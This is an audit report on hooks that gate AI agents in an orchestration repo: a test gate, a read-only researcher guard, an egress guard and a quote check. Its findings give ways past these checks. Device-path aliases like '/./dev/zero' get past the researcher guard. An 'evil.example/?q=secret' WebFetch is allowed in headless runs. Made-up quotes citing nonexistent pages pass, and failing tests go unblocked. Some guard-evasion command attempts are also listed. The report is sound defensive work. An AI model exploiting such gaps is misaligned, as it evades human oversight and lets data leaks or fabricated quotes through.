# Audit: test gate and read-only guards (2026-11-16, HEAD 16e0627)

## Summary

| id | kind | severity | title | files a fix would touch |
|----|------|----------|-------|-------------------------|
| T-1 | bug | medium | A session started with `claude --worktree` is gated as an isolated worktree: failing tests never block | verify.sh, bugfix-check.mjs (isolated flag), src/verify.test.ts |
| T-2 | bug | medium | Committed code plus one uncommitted prose file skips the tests (`no_code_changes`) | verify.sh, src/verify.test.ts |
| T-3 | bug | medium | KIND: bugfix check passes a test whose only failure on the base is an import error | bugfix-check.mjs, src/test-gate-v2.test.mjs |
| T-4 | bug | medium | unittest output is not parsed: a real reproduction test is blocked twice, then `bugfix_unverified_gave_up` | bugfix-check.mjs, docs/native-mode.md, src/test-gate-v2.test.mjs |
| T-5 | bug | low | Researcher guard device rule passed by `/./dev/...` and `//dev/...`; `wc` has no device rule | researcher-guard.mjs, src/guards.test.mjs |
| T-6 | behaviour-change | medium | Egress guard is off in every default headless run (no subagent transcript, `egress_unverified` allows) | egress-guard.mjs, journal.mjs, README.md, docs/native-mode.md, src/guards.test.mjs |
| T-7 | bug | medium | A made-up quote citing a page the PDF does not have is `unverifiable` and never blocks | quote-check.mjs, a quote-check test |
| T-8 | bug | low | Isolated worktree with `ORCH_BASELINE=allow`: the `tests_failed_isolated` doubt signal is lost | verify.sh (or brief.mjs + dashboard/register.tsx), src/verify.test.ts |
| T-9 | behaviour-change | medium | Block cap per agent id spans a SendMessage retry; give-ups are no doubt signal | verify.sh, bugfix-check.mjs, brief.mjs, dashboard/register.tsx, docs/native-mode.md, README.md, tests |
| T-10 | bug | low | Hostile xlsx cell reference makes the profiler allocate about 2 GB | file-profile.mjs, src/file-profile.test.mjs |
| T-11 | behaviour-change | low | Researcher guard false denials: narrow forms of `cd`, `sed -n`, `cut`, `stat`, `echo` | researcher-guard.mjs, src/config.ts (+ sync-agents), README.md, docs/native-mode.md, src/guards.test.mjs |
| T-12 | improvement | low | Budget above the hook timeout accepted; isolated `warn` failures pay for a base run | verify.sh, README.md, src/test-gate-v2.test.mjs |
| T-13 | bug | medium | cargo failures never named under the detected `cargo test --quiet`: cargo bugfix slices blocked wrongly | test-cmd.sh or bugfix-check.mjs, src/test-gate-v2.test.mjs |

Counts: bug 9 (medium 6, low 3), behaviour-change 3 (medium 2, low 1), improvement 1 (low), known 0, docs-drift 0 as
separate entries (the doc mismatches are folded into T-4, T-6, T-12 and T-13). Nothing here is listed as known in
CHANGELOG.md, README.md "Known limitations" or docs/native-mode.md "Known limitations": the closest known items are the
baseline's heuristic `allow` mode (README.md:408), the quote check's trust of the read cache (README.md:409) and the
egress guard's planned-files limit (README.md:410), none of which covers these findings.

## Coverage

- .claude/hooks/verify.sh: full (all 445 lines read; runs for the shared tree, an isolated worktree, a session worktree, committed-plus-prose, the block cap, bugfix and baseline paths; `pos_int` run alone). Not run: the timeout and process-group kill paths (they need a suite that hangs for minutes), the temp-folder loss path.
- .claude/hooks/test-cmd.sh: full by reading (70 lines); detection exercised through verify.sh for npm, unittest (pytest absent) and cargo. `orch_allow_rules` read, not run.
- .claude/hooks/bugfix-check.mjs: full (668 lines read); parseFailures run on real node, unittest and cargo output; bugfix mode run end to end for node, unittest and cargo; baseline run in `allow` mode. Not run: jest, vitest, pytest, go (not installed), signal cleanup, lock-file mismatch.
- .claude/hooks/researcher-guard.mjs: full (265 lines read); 25 candidate commands fed to `researcherViolation`; refusals counted in a copy of gates.jsonl.
- .claude/hooks/egress-guard.mjs: full (221 lines read); hook run with an unreadable brief; `hostOf` run on case, trailing dot, userinfo, suffix look-alike, IP, punycode and backslash forms (all correct).
- .claude/hooks/quote-check.mjs: full (241 lines read); run at SubagentStop on a text PDF with an in-range and an out-of-range page. Not run: the hand-back path.
- .claude/hooks/read-log.mjs: full by reading (108 lines); not run.
- .claude/hooks/file-profile.mjs: full by reading (646 lines); `sheetToCsv` run on hostile column references. Not run: the poppler and unzip paths on hostile files.
- Docs compared: README.md "Gate details" (lines 161-175), "How a worker launch is shaped" (188-204), "Telemetry and the read log" (206-214), switch rows 251-257 and 484-489; docs/native-mode.md lines 80, 101-105, 188-216 and "Known limitations".

## Reproductions

Slice `audit-testgate`. Every reproduction script lives in the scratch folder, called `$S` below:
`<scratch>/audit/audit-testgate`
(r1.sh, r2.sh, r4.sh, r5.sh, r8.sh, r9.sh, r10.sh, r11.mjs, r12.sh, r13.sh, rg-cands.mjs, count-denials.sh, posint.sh).
`$H` is `<repo>/.claude/hooks`. Each script makes its own
scratch project under `$S/r<n>/` and points `CLAUDE_PROJECT_DIR`, `TMPDIR` and `HOME` into `$S`; re-run one after
`rm -r $S/r<n>` (r1, r2, r4 and r5 remove their own folder first). Scripts are run as `bash $S/<script> $S $H`.

## Findings

### T-1: A session started with `claude --worktree` is gated as an isolated worktree: failing tests never block
- kind: bug
- severity: medium
- where: .claude/hooks/verify.sh:322-324 (and :418-421)
- what happens: the isolated test is a path match, `case "$PWD" in */.claude/worktrees/*) isolated=1`. Claude Code's own `--worktree` flag (`claude -w`) puts the person's whole session in a worktree under `<repo>/.claude/worktrees/<name>`. An orchestrator run started that way has its shared tree there, so every shared-tree implementer is treated as isolated: in the default `warn` mode a failing suite logs `tests_failed_isolated` and the stop goes through; in `skip` the tests do not run at all. The bugfix helper also gets `--isolated 1` and takes the fork point from the main worktree as its base instead of HEAD.
- reproduction: `bash $S/r1.sh $S $H` (a git repo at `$S/r1/proj/.claude/worktrees/sess`, a test script that exits 1, an uncommitted change to `a.js`, implementer stop with `cwd` and `CLAUDE_PROJECT_DIR` set to that repo, `ORCH_BASELINE=off ORCH_BUGFIX_CHECK=off`). Observed:
  ```
  exit=0
  {"ts":"2026-11-16T07:32:06.798Z","gate":"test","decision":"warn","reason":"tests_failed_isolated","agent_type":"implementer","agent_id":"audit-a1","session_id":"audit-1"}
  ```
- expected: verify.sh:13-15 "Isolated worktrees (cwd under .claude/worktrees/) follow ORCH_GATE_ISOLATED, because sibling slices may not be merged yet"; docs/native-mode.md:105 "Isolated worktrees. Only code in a git repository runs in them. Sibling slices may not be merged yet". A session worktree has no sibling slices: the agent's cwd is the session's own project folder, so it should be gated like the shared tree (`tests_failed`, exit 2). The rule should compare the agent's cwd with the project folder (`$project`), e.g. isolated only when `$PWD` is under `$project/.claude/worktrees/` and differs from `$project`, or when the cwd's worktree is not the worktree of `$project`.
- fix scope: .claude/hooks/verify.sh (the isolated test; dist/plugin copy rebuilt), bugfix-check.mjs receives the corrected flag; a case in src/verify.test.ts with the project itself under `.claude/worktrees/`.
- confidence: 75 (the path rule is proven; that `claude -w` places the session at `.claude/worktrees/<name>` is from Claude Code's worktree documentation, not probed here)

### T-2: Committed code plus one uncommitted prose file skips the tests (`no_code_changes`)
- kind: bug
- severity: medium
- where: .claude/hooks/verify.sh:277-291 and :337-340
- what happens: `only_prose_changed` judges `git status` only, i.e. changes against HEAD. An isolated slice commits its work (worker contract) and HEAD moves with it, so when the slice commits code and leaves one prose file uncommitted (a note, a README line written after the commit), the status lists only that prose file and the gate allows `no_code_changes` without running the suite. With `ORCH_GATE_ISOLATED=block` a failing suite passes the gate; in the default `warn` mode the `tests_failed_isolated` doubt signal is lost (the record says `no_code_changes` instead), so no opus review is required for it. The header's clean-tree rule ("a clean tree (an isolated slice that already committed) ... keep the test run") covers the fully committed case only.
- reproduction: `bash $S/r2.sh $S $H` (main repo `$S/r2/main`, worktree `$S/r2/main/.claude/worktrees/w`, a commit there that makes `npm test` exit 1, then an untracked `NOTES.md`). Observed:
  ```
  mode=block exit=0
  {"ts":"2026-11-16T07:32:19.101Z","gate":"test","decision":"allow","reason":"no_code_changes",...,"agent_id":"audit-a2-block",...}
  mode=warn exit=0
  {"ts":"2026-11-16T07:32:19.205Z","gate":"test","decision":"allow","reason":"no_code_changes",...,"agent_id":"audit-a2-warn",...}
  npm test in worktree: exit=1
  ```
- expected: verify.sh:6-12 skips only when "every changed path ... is prose" and says "Judged from git, never from what the agent says"; docs/native-mode.md:101 "any doubt keeps the tests". The slice's changed paths include the committed `a.js`. The prose check should also take `git diff --name-only <base>` for the slice's base (the fork point from the main worktree's HEAD, as `baseInfo` in bugfix-check.mjs already computes) in an isolated worktree, or skip only when HEAD equals that base.
- fix scope: .claude/hooks/verify.sh (only_prose_changed), possibly reuse bugfix-check.mjs `baseInfo`; src/verify.test.ts.
- confidence: 85

### T-3: KIND: bugfix check passes a test whose only failure on the base is an import error
- kind: bug
- severity: medium
- where: .claude/hooks/bugfix-check.mjs:604-617 (the with-tests run's `crash` and `unqualified` are never looked at; any new qualified name counts)
- what happens: the check copies the changed test files into the base and counts any new qualified failure that lives in a copied file. When the test imports a file the slice added (a new helper or a new export that is not a test file, so it is not copied), node's runner reports the whole file as failed (`test at <file>`), which parses as a qualified failure in the copied file, and the gate allows `bugfix_verified` although the test body never ran on the base. In the reproduction the "fix" leaves the bug in place.
- reproduction: `bash $S/r4.sh $S $H` (base: `src/add.mjs` returns `a - b`; tree: new `src/helper.mjs` and `test/add.test.mjs` that imports it and asserts nothing; brief with `KIND: bugfix` in the agent transcript; full verify.sh run). Observed:
  ```
  exit=0
  {"ts":"2026-11-16T07:32:44.555Z","gate":"test","decision":"allow","reason":"bugfix_verified","agent_type":"implementer","agent_id":"audit-a4","session_id":"audit-4","test_files":1,"new_failing":1}
  add(2,2) = 0
  ```
- expected: bugfix-check.mjs:15-18 "the base run with those files copied in must show at least one new qualified failing test"; docs/native-mode.md (Bugfix check) and the implementer rule "write a failing reproduction test first": a test that reproduces the bug fails on its assertion, not on loading. A file-level failure (node: a `not ok`/`✖` whose name is the file itself; pytest `ERROR` collecting; jest "Test suite failed to run"; vitest file `FAIL ... [ file ]`) should not count as a reproduction, or the run with the copied files should have to be free of crash markers for its names to count.
- fix scope: .claude/hooks/bugfix-check.mjs (bugfix: ignore file-level failures or require `!withTests.failures.crash`, plus a node file-failure marker in parseFailures), src/test-gate-v2.test.mjs or src/bugfix-check-reasons.test.mjs.
- confidence: 80

### T-4: unittest output is not parsed: a real reproduction test is blocked twice, then `bugfix_unverified_gave_up`
- kind: bug
- severity: medium
- where: .claude/hooks/bugfix-check.mjs:168 (only `FAILED`/`ERROR` followed by whitespace) with .claude/hooks/test-cmd.sh:22-26 (unittest is the detected runner when pytest is not installed)
- what happens: `python3 -m unittest discover -q` prints `FAIL: test_add (test_add.T.test_add)` and `ERROR: ...`; no parser branch reads that form, so a unittest run never yields a test name. A KIND: bugfix slice with a correct reproduction test (fails on the base, passes with the fix) is blocked with `bugfix_test_passes_on_base` twice, and the third stop ends as `bugfix_unverified_gave_up`. The baseline note (`inform`) never fires for unittest either.
- reproduction: `bash $S/r5.sh $S $H` (python3 without pytest; base `calc.add` returns `a - b`; tree fixes it and adds `test_add.py`; three stops of one agent). Observed:
  ```
  stop 1 exit=2  ... "reason":"bugfix_test_passes_on_base"
  stop 2 exit=2  ... "reason":"bugfix_test_passes_on_base"
  stop 3 exit=0  ... "reason":"bugfix_unverified_gave_up"
  FAIL: test_add (test_add.T.test_add)        <- the copied test does fail on the base
  FAILED (failures=1)
  ```
- expected: bugfix-check.mjs:15-18 (a reproduction test that fails on the base is verified); docs/native-mode.md:103 names unittest as a detected runner, and docs/native-mode.md:212 "Failing tests are read from node `--test`, jest, vitest, pytest, go and cargo output" (unittest is silently missing). Either parse `^(FAIL|ERROR): (\S+) \(([\w.]+)\)` qualified by the module path (`test_add.T.test_add` maps to `test_add.py`), or answer "no opinion" (no block) when the runner has no parser, and document unittest as unsupported.
- fix scope: .claude/hooks/bugfix-check.mjs (parseFailures, inFiles for dotted module ids), docs/native-mode.md (Bugfix check), src/test-gate-v2.test.mjs.
- confidence: 90

### T-5: The researcher guard's device rule is passed by `/./dev/...` and `//dev/...`, and `wc` has no device rule
- kind: bug
- severity: low
- where: .claude/hooks/researcher-guard.mjs:45 (`DEVICE = /^(?:--[^=]+=|-[A-Za-z0-9]+=?)?(\/dev\/.*)$/`), :217-224 (only search and paging commands are checked; `wc`, `ls`, `du` return early at :217)
- what happens: the device check is a text prefix match on `/dev/`. The same devices are reached as `/./dev/zero`, `//dev/zero` or `/private/../dev/zero`, which the regex does not see, so `cat /./dev/zero` and `tail -c +1 /./dev/urandom` are allowed and read for ever. `wc` is allowed with any argument, so `wc /dev/zero` or `wc -c /dev/stdin` also never ends. The Bash tool's timeout still ends each run, so this costs time, not a write or a program start; no write or exec escape was found (see Unproven).
- reproduction: `cd $S && CLAUDE_PROJECT_DIR=$S/r1 node $S/rg-cands.mjs 'cat /./dev/zero' 'cat //dev/zero' 'tail -c +1 /./dev/urandom' 'wc /dev/zero' 'wc -c /dev/stdin'` (rg-cands.mjs imports `researcherViolation` from the live hook and prints its verdict), plus `head -c 8 /./dev/zero | od -c | head -1` to show the alias reaches the device. Observed:
  ```
  "cat /./dev/zero" -> ALLOW
  "cat //dev/zero" -> ALLOW
  "tail -c +1 /./dev/urandom" -> ALLOW
  "wc /dev/zero" -> ALLOW
  "wc -c /dev/stdin" -> ALLOW
  0000000   \0  \0  \0  \0  \0  \0  \0  \0
  ```
- expected: researcher-guard.mjs:12-13 "none of them on a /dev/ device (also as an option's value)"; README.md:170 "none of them on a `/dev/` device other than `/dev/null`". Normalise the path before the test (`path.posix.normalize`, which turns `/./dev/zero` and `//dev/zero`... into `/dev/zero`; a leading `//` needs an explicit collapse) and apply the same check to `wc`.
- fix scope: .claude/hooks/researcher-guard.mjs (DEVICE test on a normalised path; `wc` in the device check), src/guards.test.mjs.
- confidence: 90

### T-6: The egress guard is off in every default headless run (no subagent transcript, so `egress_unverified` allows)
- kind: behaviour-change
- severity: medium
- where: .claude/hooks/egress-guard.mjs:161-163 (no transcript, no brief: `unverified`, which the hook turns into an allow at :207-220)
- what happens: the guard reads the reviewer's brief from the subagent's own transcript. `scripts/orchestrate.sh` passes `--no-session-persistence` unless `ORCH_SESSION_PERSISTENCE=1`, and then no subagent transcript is written (docs/benchmark-onext.md:62: "subagent transcripts are never written and the hook cannot read the slice from the brief"). So in every default `npm run native` / `npm run auto` run, the unattended case, every reviewer WebFetch is allowed with `egress_unverified`, whatever the host. `npm run auto` adds WebFetch to non-code tasks itself (docs/native-mode.md:251). The fail-open rule is documented; its effect on headless runs is stated nowhere.
- reproduction: `bash $S/r9.sh $S $H` (a reviewer WebFetch of `https://evil.example/?q=secret` whose session transcript folder holds no `subagents/agent-a9.jsonl`, as in a run without session persistence). Observed:
  ```
  exit=0
  {"ts":"2026-11-16T07:36:43.032Z","gate":"egress","decision":"allow","reason":"egress_unverified","host":"evil.example","session_id":"audit-9","agent_id":"a9"}
  ```
- expected: egress-guard.mjs:16 and docs/native-mode.md:193 "An unreadable brief allows and logs `egress_unverified`" (documented, so this is a proposal, not a bug). Proposal: have the plan check record the brief's URL hosts (hosts only, like the gate log) in the reviewer's launch record (`journal-launches.jsonl`, which `bugfix-check.mjs agentKind` already uses as a fallback for the brief) and let the guard fall back to it; or deny when neither the transcript nor the launch record can be read; at least name the headless effect in README "Known limitations".
- fix scope: .claude/hooks/egress-guard.mjs, .claude/hooks/journal.mjs (launch record field), README.md and docs/native-mode.md (Guards), src/guards.test.mjs.
- confidence: 80 (that `--no-session-persistence` leaves no subagent transcript is taken from docs/benchmark-onext.md:62 and docs/benchmark-compare-040.md:76, not probed here)

### T-7: A made-up quote that cites a page the PDF does not have is `unverifiable` and never blocks
- kind: bug
- severity: medium
- where: .claude/hooks/quote-check.mjs:185 (`src.pages[page - 1] ?? ""`)
- what happens: when a PDF quote is not found, the check looks at the cited page and calls the quote unverifiable when that page has under 100 non-space characters. A page number beyond the document (or the empty element after pdftotext's last form feed, page N+1) reads as `""`, so the quote counts as unverifiable and the researcher is never sent back. Citing a page that does not exist is the easiest way for a fabricated quote to pass.
- reproduction: `bash $S/r8.sh $S $H` (a scratch project with `src/fixtures/files/text.pdf` copied as `report.pdf`, 3 pages; one researcher stop per cited page with `QUOTE: report.pdf p. <n> | The board approved a merger with Initech.`, text that is not in the PDF). Observed:
  ```
  page 1 exit=2
  ... "total":1,"verified":0,"unverified":1,"unverifiable":0,"blocked":true,...
  page 999 exit=0
  ... "total":1,"verified":0,"unverified":0,"unverifiable":1,"blocked":false}
  ```
- expected: quote-check.mjs:17-19 lists as unverifiable only "a PDF with no usable text layer (a scan), a quote whose page has no text"; docs/native-mode.md (Quote check) and .claude/rules/agents.md "Quotes from scans and from URLs are unverifiable". A page that does not exist is neither: the quote should count as unverified (the page test should apply only when `1 <= page <= prof.pages`).
- fix scope: .claude/hooks/quote-check.mjs (page range check, using the profile's `pages`), a quote-check case in src/router.test.mjs or src/guards.test.mjs.
- confidence: 90

### T-8: In an isolated worktree with `ORCH_BASELINE=allow`, a test failure loses its `tests_failed_isolated` doubt signal
- kind: bug
- severity: low
- where: .claude/hooks/verify.sh:406-421 (the `allow` exit at :408-411 comes before the isolated branch at :418), with .claude/hooks/brief.mjs:803-810 (the run model reads only `reason === "tests_failed_isolated"`)
- what happens: in an isolated worktree a failing suite is never blocked (default `warn`) but is logged `tests_failed_isolated`, which is a doubt signal that requires an opus review under escalation. With `ORCH_BASELINE=allow`, when every failing test also fails on the base, the hook exits with `warn tests_failed_baseline` before it reaches the isolated branch, so the record no longer names an isolated failure and the slice carries no doubt signal. The same order also runs the base (up to `ORCH_BASE_TIMEOUT_S`) for every isolated failure in `warn` mode, where the outcome cannot change the decision (see T-12).
- reproduction: `bash $S/r12.sh $S $H` (main repo `$S/r12/main` whose base already has a failing node test; worktree `.claude/worktrees/w` with one committed change; `ORCH_BASELINE=allow`, default `ORCH_GATE_ISOLATED`). Observed:
  ```
  exit=0
  {"ts":"2026-11-16T07:39:34.221Z","gate":"test","decision":"warn","reason":"tests_failed_baseline","agent_type":"implementer","agent_id":"audit-a12","session_id":"audit-12","failing":1,"base_failing":1}
  806:      g.reason === "tests_failed_isolated" &&
  ```
- expected: verify.sh:13-15 (isolated worktrees in `warn` mode "log tests_failed_isolated, never block"); .claude/rules/agents.md "Doubt signals: ... an isolated test failure". Either take the isolated branch first (log `tests_failed_isolated` with the baseline counts as extra fields), or let `brief.mjs` count `tests_failed_baseline` from an isolated cwd as the same signal.
- fix scope: .claude/hooks/verify.sh (order of the baseline and isolated branches), or .claude/hooks/brief.mjs plus its mirror `dashboard/register.tsx`; src/verify.test.ts or src/test-gate-v2.test.mjs.
- confidence: 85

### T-9: The two-block cap is per agent id, so a retry resumed with SendMessage is never blocked by failing tests, and the give-up is no doubt signal
- kind: behaviour-change
- severity: medium
- where: .claude/hooks/verify.sh:423-431 (count of `tests_failed` blocks for the agent id over the whole log); .claude/hooks/brief.mjs:803-810 (only `tests_failed_isolated` becomes a doubt signal, not `max_blocks_reached` or `bugfix_unverified_gave_up`)
- what happens: the orchestrator's second attempt at a slice resumes the same implementer with `SendMessage` (.claude/rules/agents.md, retry flow), so it keeps its agent id. When the first attempt used its two `tests_failed` blocks, every stop of the resumed attempt is allowed at once with `max_blocks_reached`, failing tests or not. And neither that give-up nor `bugfix_unverified_gave_up` is a doubt signal, so a slice whose implementer finished with a failing suite in the shared tree needs no opus review, while an isolated failure (which the gate does not even block) does.
- reproduction: `bash $S/r10.sh $S $H` (shared tree, a suite that always fails, four stops of agent `audit-a10`; stop 4 stands for the resumed attempt). Observed:
  ```
  stop 1 exit=2 "decision":"block","reason":"tests_failed"
  stop 2 exit=2 "decision":"block","reason":"tests_failed"
  stop 3 exit=0 "decision":"allow","reason":"max_blocks_reached"
  stop 4 exit=0 "decision":"allow","reason":"max_blocks_reached"
  ```
- expected: documented as "At most 2 blocks per agent, then it lets the agent finish" (docs/native-mode.md:80; verify.sh:93), so this is a proposal: count blocks since the agent's latest SubagentStart (a resume fires one) or since its latest stop that a review judged, and add `max_blocks_reached` and `bugfix_unverified_gave_up` of the slice's latest attempt to the doubt signals in `brief.mjs` (and its dashboard mirror).
- fix scope: .claude/hooks/verify.sh (cap scope), .claude/hooks/bugfix-check.mjs (`bugfix` counts the same way), .claude/hooks/brief.mjs and dashboard/register.tsx (doubt signals), docs/native-mode.md and README.md (gate tables, doubt signal list), src/verify.test.ts, src/brief*.test.
- confidence: 75 (that a SendMessage resume keeps the agent id is the repo's own retry rule; not probed live here)

### T-10: A hostile xlsx cell reference makes the profiler allocate about 2 GB (no cap on column letters)
- kind: bug
- severity: low
- where: .claude/hooks/file-profile.mjs:344-349 (`colIndex`, unbounded) and :383-384 (`while (cells.length < idx) cells.push("")`)
- what happens: `sheetToCsv` pads a row up to the column of each cell's `r` attribute. The row number is capped at Excel's limit (`MAX_SHEET_ROWS`) but the column is not: `r="ZZZZZZ1"` asks for 321 million cells. The quote check calls `profileFile` in its own process with no time budget (quote-check.mjs:144), so a researcher quoting such a file holds its SubagentStop for the duration and memory of the conversion; the router runs it in a child with a budget and only loses the routing.
- reproduction: `cd $S && timeout 60 node --max-old-space-size=1024 $S/r11.mjs` (calls the live `sheetToCsv` on one-cell rows). Observed:
  ```
  XFD: 16384 chars, 1 ms, rss 55 MB
  ZZZZ: 475254 chars, 5 ms, rss 75 MB
  ZZZZZ: 12356630 chars, 132 ms, rss 203 MB
  ZZZZZZ: THREW RangeError: Invalid array length, 1186 ms, rss 2049 MB
  ```
- expected: file-profile.mjs:356-357 caps rows at Excel's limit for the same reason; Excel's last column is XFD (16,384). A cell beyond it should be skipped like a row beyond `MAX_SHEET_ROWS`.
- fix scope: .claude/hooks/file-profile.mjs (cap `idx` at 16383), src/file-profile.test.mjs.
- confidence: 85

### T-11: Researcher guard false denials: `cd`, `sed -n`, `cut`, `stat` and `echo` could be allowed in narrow forms
- kind: behaviour-change
- severity: low
- where: .claude/hooks/researcher-guard.mjs:29-34 (allowed prefixes), :193-200 (`allowedWords`)
- what happens: in a copy of the live log (38 `researcher` records, 2026-10-31 to 2026-11-16), the refused first words are `cd` 10, none recorded 8 (redirections), `sed` 5, `cut` 4, `grep` 2 (before 1.2.0), `git` 2, `ls` 2, and `rm`, `echo`, `stat`, `node`, `bash` once each. A refusal costs the researcher a turn and the command it wanted was read-only. Forms that cannot write a file or start a program:
  - `cd <one literal path>` as a segment of its own (no option, no expansion; the next segments are checked as now). It changes only the shell's folder. Caveat: a zsh user's own `chpwd` functions run on `cd`; they are the person's code, not the researcher's.
  - `sed -n '<N>p'` or `sed -n '<N>,<M>p'` exactly: the script must match `^[0-9]+(,[0-9]+)?p$`, no other option (refuses `-i`, `w`, `e`, `s///w` and `s///e`, which write or run), the rest file operands under the existing device rule.
  - `cut` with `-b`, `-c`, `-f`, `-d`, `-s`, `--complement`, `--output-delimiter` and file operands (it has no write or exec option), under the device rule.
  - `stat` with any option (BSD `-f`/`-s`, GNU `-c`/`--printf`): it reads metadata only.
  - `echo` (and `printf` without `-v`): output only, and redirections are refused anyway.
  Keep `rm`, `node` and `bash` refused.
- reproduction: `bash $S/count-denials.sh $S` (copies the live gates.jsonl to `$S/state-copy/` and counts the `researcher` records by `word`); and `cd $S && CLAUDE_PROJECT_DIR=$S/r1 node $S/rg-cands.mjs 'cd /repo && git log -1' "sed -n '10,40p' /repo/a.md" 'cut -d, -f1 /repo/a.csv' 'stat -f %z /repo/a' 'echo ---'`. Observed:
  ```
  researcher records 38 first 2026-10-31T14:14:59.518Z last 2026-11-16T06:20:40.266Z
  cd:10  (none):8  sed:5  cut:4  grep:2  git:2  ls:2  rm:1  echo:1  stat:1  node:1  bash:1
  "cd /repo && git log -1" -> DENY `cd` is not an allowed command; put absolute paths in the co
  "sed -n '10,40p' /repo/a.md" -> DENY `sed` is not an allowed command; to print a line range use t
  "cut -d, -f1 /repo/a.csv" -> DENY `cut` is not an allowed command; use only grep, rg, find, he
  "stat -f %z /repo/a" -> DENY `stat` is not an allowed command; use only grep, rg, find, h
  "echo ---" -> DENY `echo` is not an allowed command; use only grep, rg, find, h
  ```
- expected: the refusals are documented, intended behaviour (researcher-guard.mjs:2-6, docs/native-mode.md:192, the researcher's `tools` line), so this is a proposal for the owner. The guard's own aim (researcher-guard.mjs:10, "forms that cannot write a file or start a program") is met by each form above. Adding any of them also needs the researcher's `tools` list in src/config.ts (and `npm run sync-agents`), since the session's permission rules decide after the guard.
- fix scope: .claude/hooks/researcher-guard.mjs, src/config.ts (researcher tools) and .claude/agents/researcher.md via sync-agents, README.md and docs/native-mode.md (Guards), src/guards.test.mjs.
- confidence: 70 (the counts are proven; that each form is safe is from the tools' documented options)

### T-12: Test gate time settings: a budget above the hook timeout is accepted, and isolated `warn` failures pay for a base run
- kind: improvement
- severity: low
- where: .claude/hooks/verify.sh:96-101 (`pos_int` takes any whole number above 0), :403-421 (the base run before the isolated `warn` exit)
- what happens: (a) `ORCH_HOOK_BUDGET_S` exists so the hook ends before its 900 s timeout, because a hook killed at its timeout does not block (verify.sh:32-33). A value above 870 is taken as it is (`pos_int 5000 870` gives 5000), so with a slow suite the hook can be killed and the stop goes through unblocked; `ORCH_READ_ROUTER_BUDGET_MS` is capped for the same reason, this one is not. Odd values are otherwise safe: `0`, `-5`, `1e3`, `abc` and numbers past 2^63 fall back to the default, and leading zeros read as decimal (`0870` gives 870, `08` gives 8). (b) In an isolated worktree in the default `warn` mode the decision is always `warn`, yet a failing suite first starts a base run (up to `ORCH_BASE_TIMEOUT_S`, 300 s) only to add counts to the record.
- reproduction: `sed -n '96,98p' $H/verify.sh > $S/posint.sh` then, for each value, `/bin/bash -c ". $S/posint.sh; pos_int '<v>' 870"`. Observed (bash 3.2.57; the same with the bash on PATH):
  ```
  870 -> 870    0870 -> 870    08 -> 8    0 -> 870    -5 -> 870    1e3 -> 870    abc -> 870
  99999999999999999999 -> 870    9223372036854775808 -> 870    900 -> 900    5000 -> 5000
  ```
  (b) by reading: verify.sh:406-407 `elif [ "${ORCH_BASELINE:-}" != off ]; then check baseline "$out" 1` runs before :418 `if [ "$isolated" = 1 ] && [ "$mode" != block ]; then log_gate warn tests_failed_isolated`.
- expected: verify.sh:32-43 ("the whole hook ends within ORCH_HOOK_BUDGET_S ... So test run + base run (or bugfix check) <= 870 s < 900 s"); README.md:486. Cap the budget at 870 (or document that raising it needs a larger hook timeout), and skip the base run in isolated `warn` mode, or run it only when its counts are wanted.
- fix scope: .claude/hooks/verify.sh, README.md:486, src/test-gate-v2.test.mjs.
- confidence: 80

### T-13: cargo failures are never named under the detected `cargo test --quiet`, so a cargo bugfix slice is blocked wrongly
- kind: bug
- severity: medium
- where: .claude/hooks/bugfix-check.mjs:177-180 (cargo names need a `Running <target>` line and `test <name> ... FAILED`), with .claude/hooks/test-cmd.sh:29 (the detected command is `cargo test --quiet`)
- what happens: with `--quiet` cargo prints no `Running <target>` status lines and libtest prints the terse form (`tests::adds --- FAILED` in the failure list, no `test x ... FAILED` line), so `parseFailures` finds no name and sets `crash` (from `error: test failed`). Every cargo run the gate itself starts is therefore unparsable: the baseline note never appears, and a KIND: bugfix slice with a real reproduction test is blocked with `bugfix_test_passes_on_base` (twice, then `bugfix_unverified_gave_up`, as in T-4). src/test-gate-v2.test.mjs:91 pins only the verbose format, which the gate never produces.
- reproduction: `bash $S/r13.sh $S $H` (first parses `$S/r6/out.txt`, the output of `cargo test --quiet --offline` on a one-test crate; then a crate whose base `add` returns `a - b`, the fix, and a new `tests/add_test.rs` that fails on the base; full verify.sh run with `KIND: bugfix`). Observed:
  ```
  parse of r6/out.txt: {"names":[],"unqualified":[],"crash":true}
  exit=2
  {"ts":"2026-11-16T07:41:39.159Z","gate":"test","decision":"block","reason":"bugfix_test_passes_on_base",...,"test_files":1,"new_failing":0}
  KIND: bugfix: the changed test files (tests/add_test.rs) add no failing test on e4bff31f without the fix: ...
  ```
  (`$S/r6/out.txt` was made by `cd $S/r6/c && CARGO_TARGET_DIR=$S/r6/target TMPDIR=$S/tmp cargo test --quiet --offline`; it holds `running 1 test`, `tests::adds --- FAILED`, `error: test failed, to rerun pass --lib`.)
- expected: docs/native-mode.md:212 "Failing tests are read from node `--test`, jest, vitest, pytest, go and cargo output"; bugfix-check.mjs:59 "cargo: test name ... FAILED qualified by the preceding Running <target>". Either run the gate and the base with a cargo command that prints the targets and names (without `--quiet`: the `Running` lines are cargo's own status output), or parse the quiet form (`<name> --- FAILED` qualified by the `--lib`/`--test <name>` hint of `error: test failed, to rerun pass ...`).
- fix scope: .claude/hooks/test-cmd.sh (the cargo command, and `orch_allow_rules` keeps matching `cargo test*`) or .claude/hooks/bugfix-check.mjs (parseFailures); src/test-gate-v2.test.mjs with quiet-format output.
- confidence: 85

## Unproven

- Researcher guard write or exec escapes: none found. Tried and refused: `find . -dele\te`, `find . -dele''te`, `find . -de"le"te`; `cat x 2>/dev/null 1>&2`. Tried and allowed but harmless: `git log --outpu=x` and `git log --out=x` (git 2.54 rejects the abbreviation: `fatal: unrecognized argument`, no file written), `grep -n -e '-v' a.md`. Not tested: programs that the repository's own git config names (`diff.<driver>.textconv` on `git log -p`/`git show`, `--ext-diff`, `core.fsmonitor` on `git status`): they run only from a hostile `.git/config`, which the researcher cannot write.
- go: `inFiles` (bugfix-check.mjs:218) skips a test file whose folder is `.`, so a reproduction test in the module's root package might never count. go is not installed here, so neither go's output nor the gate run could be made.
- quote-check.mjs with several large PDFs: each uncached PDF may take pdfinfo 5 s + pdftotext 20 s + pdfimages 5 s in the hook's own process, so three such sources could pass a 60 s hook timeout (a hook killed at its timeout does not block). Not timed.
- Prose skip and ignored files: a change to a git-ignored code file (`.env`, generated code) next to a `.md` change would read as prose-only. Not run; low value.
- test-cmd.sh: a `GNUmakefile`, or a `test :` target with a space before the colon, is not detected (grep `^test:`). By reading only.
- verify.sh `json_str` takes the last match of a key on the line (greedy `.*`); a quoted key inside a JSON string value cannot match because its quotes are escaped, so no wrong agent type or cwd could be produced. Reasoned, not fuzzed.
